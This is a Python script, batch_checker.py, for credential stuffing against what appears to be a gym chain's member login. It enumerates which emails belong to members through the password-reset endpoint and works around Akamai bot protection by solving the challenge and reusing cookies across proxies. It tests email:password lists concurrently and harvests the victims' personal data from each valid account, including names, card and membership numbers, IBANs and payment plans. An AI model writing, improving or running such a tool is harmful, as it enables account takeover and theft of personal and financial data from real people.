"""
Batch credential checker with pre-check, cookie reuse, and member capture.

Pipeline:
  1. Pre-check emails via password reset endpoint (no Akamai, fast)
  2. Filter to gym members only
  3. Solve Akamai + check credentials (3 per solve via cookie reuse)
  4. Capture member data for valid logins (SSO + member info)

Usage:
  python batch_checker.py <creds_file> [workers] [--no-precheck] [--no-capture]

  creds_file: one email:password per line
  workers: concurrent workers (default: 10)
"""
import json
import os
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

os.environ.setdefault("SOLVER", "jsdom")

from solver_jsdom import (
    solve_session, check_credential, cleanup_session,
    pre_check_email, _log, _make_proxy, REUSE_LIMIT,
)


def load_credentials(path):
    creds = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" in line:
                email, password = line.split(":", 1)
                creds.append((email.strip(), password.strip()))
    return creds


def pre_check_batch(creds, workers=20):
    _log(f"Pre-checking {len(creds)} emails for gym membership...")
    t0 = time.time()
    results = {}
    lock = threading.Lock()

    def check_one(email):
        proxy_url, _ = _make_proxy()
        is_member = pre_check_email(email, proxy_url)
        with lock:
            results[email] = is_member
        tag = "MEMBER" if is_member else ("NOT MEMBER" if is_member is False else "ERROR")
        _log(f"  {email} -> {tag}")

    with ThreadPoolExecutor(max_workers=workers) as pool:
        pool.map(check_one, [e for e, _ in creds])

    members = [(e, p) for e, p in creds if results.get(e) is True]
    non_members = [(e, p) for e, p in creds if results.get(e) is False]
    errors = [(e, p) for e, p in creds if results.get(e) is None]

    dt = time.time() - t0
    _log(f"Pre-check done in {dt:.1f}s: {len(members)} members, "
         f"{len(non_members)} not members, {len(errors)} errors")

    return members, non_members, errors


def worker(wid, batch, results_lock, results, capture=True):
    _log(f"[W{wid}] Solving for batch of {len(batch)} creds...")
    ctx = solve_session()
    if not ctx:
        _log(f"[W{wid}] Solve failed")
        with results_lock:
            for email, _ in batch:
                results.append({"email": email, "valid": None, "error": "solve failed"})
        return

    try:
        for i, (email, password) in enumerate(batch):
            if ctx["uses_left"] <= 0:
                _log(f"[W{wid}] Cookie expired, re-solving...")
                cleanup_session(ctx)
                ctx = solve_session()
                if not ctx:
                    with results_lock:
                        for em, _ in batch[i:]:
                            results.append({"email": em, "valid": None, "error": "re-solve failed"})
                    return

            _log(f"[W{wid}] Checking {email} ({ctx['uses_left']} left)...")
            result = check_credential(ctx, email, password, capture=capture)
            tag = "VALID" if result.get("valid") else str(result.get("status", "?"))
            _log(f"[W{wid}] {email} -> {tag}")

            with results_lock:
                results.append(result)
    finally:
        cleanup_session(ctx)


def batch_check(creds, workers=10, do_precheck=True, do_capture=True):
    t_total_start = time.time()

    if do_precheck:
        members, non_members, check_errors = pre_check_batch(creds, workers=min(workers * 2, 50))
        if not members:
            _log("No gym members found, nothing to check")
            return []
        creds_to_check = members
    else:
        creds_to_check = creds

    batches = [creds_to_check[i:i + REUSE_LIMIT] for i in range(0, len(creds_to_check), REUSE_LIMIT)]
    n_solves = len(batches)
    _log(f"Checking {len(creds_to_check)} credentials: {n_solves} solves needed, {workers} workers")

    results = []
    results_lock = threading.Lock()
    t_start = time.time()

    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {}
        for i, batch in enumerate(batches):
            f = pool.submit(worker, i + 1, batch, results_lock, results, capture=do_capture)
            futures[f] = i + 1
        for f in as_completed(futures):
            try:
                f.result()
            except Exception as e:
                _log(f"Worker error: {e}")

    t_check = time.time() - t_start
    t_total = time.time() - t_total_start

    valid = [r for r in results if r.get("valid") is True]
    invalid = [r for r in results if r.get("valid") is False]
    errors = [r for r in results if r.get("valid") is None]

    print(f"\n{'='*60}")
    print(f"BATCH CHECK RESULTS")
    print(f"{'='*60}")
    if do_precheck:
        print(f"Pre-check: {len(creds)} emails -> {len(creds_to_check)} gym members")
    print(f"Checked:   {len(results)}/{len(creds_to_check)}")
    print(f"Valid:     {len(valid)}")
    print(f"Invalid:   {len(invalid)}")
    print(f"Errors:    {len(errors)}")
    print(f"Solves:    {n_solves}")
    print(f"Time:      {t_total:.1f}s total ({t_check:.1f}s checking)")
    print(f"Rate:      {len(results)/max(t_check,0.1):.1f} checks/sec")

    if valid:
        print(f"\nValid credentials:")
        for r in valid:
            print(f"  {r['email']}")
            if r.get("member"):
                m = r["member"]
                fields = [
                    ("first_name", "Name"),
                    ("last_name", "Surname"),
                    ("home_club", "Club"),
                    ("membership_status_g", "Status"),
                    ("membership_type_g", "Type"),
                    ("card_number_s", "Card"),
                    ("membership_number_s", "Member#"),
                    ("mailing_city", "City"),
                    ("mailing_country", "Country"),
                    ("iban", "IBAN"),
                ]
                for key, label in fields:
                    if key in m and m[key]:
                        print(f"    {label}: {m[key]}")
                pp = m.get("payment_plan", {})
                if pp:
                    print(f"    Plan: {pp.get('short_description', '?')} "
                          f"({pp.get('term_fee', '?')} EUR/{pp.get('interval', '?')})")

    if errors:
        print(f"\nErrors:")
        for r in errors:
            print(f"  {r['email']}: {r.get('error', 'unknown')}")

    if valid and do_capture:
        out_path = "results.json"
        with open(out_path, "w") as f:
            json.dump(valid, f, indent=2, ensure_ascii=False)
        _log(f"Valid results saved to {out_path}")

    return results


if __name__ == "__main__":
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    flags = [a for a in sys.argv[1:] if a.startswith("--")]

    if not args:
        print("Usage: python batch_checker.py <creds_file> [workers] [--no-precheck] [--no-capture]")
        print("  creds_file: one email:password per line")
        print(f"  Each solve is reused for {REUSE_LIMIT} credential checks")
        print("  --no-precheck: skip gym membership pre-check")
        print("  --no-capture: skip member data capture on valid login")
        sys.exit(1)

    creds_file = args[0]
    workers = int(args[1]) if len(args) > 1 else 10
    do_precheck = "--no-precheck" not in flags
    do_capture = "--no-capture" not in flags

    creds = load_credentials(creds_file)
    if not creds:
        print("No credentials found in file")
        sys.exit(1)

    batch_check(creds, workers, do_precheck=do_precheck, do_capture=do_capture)
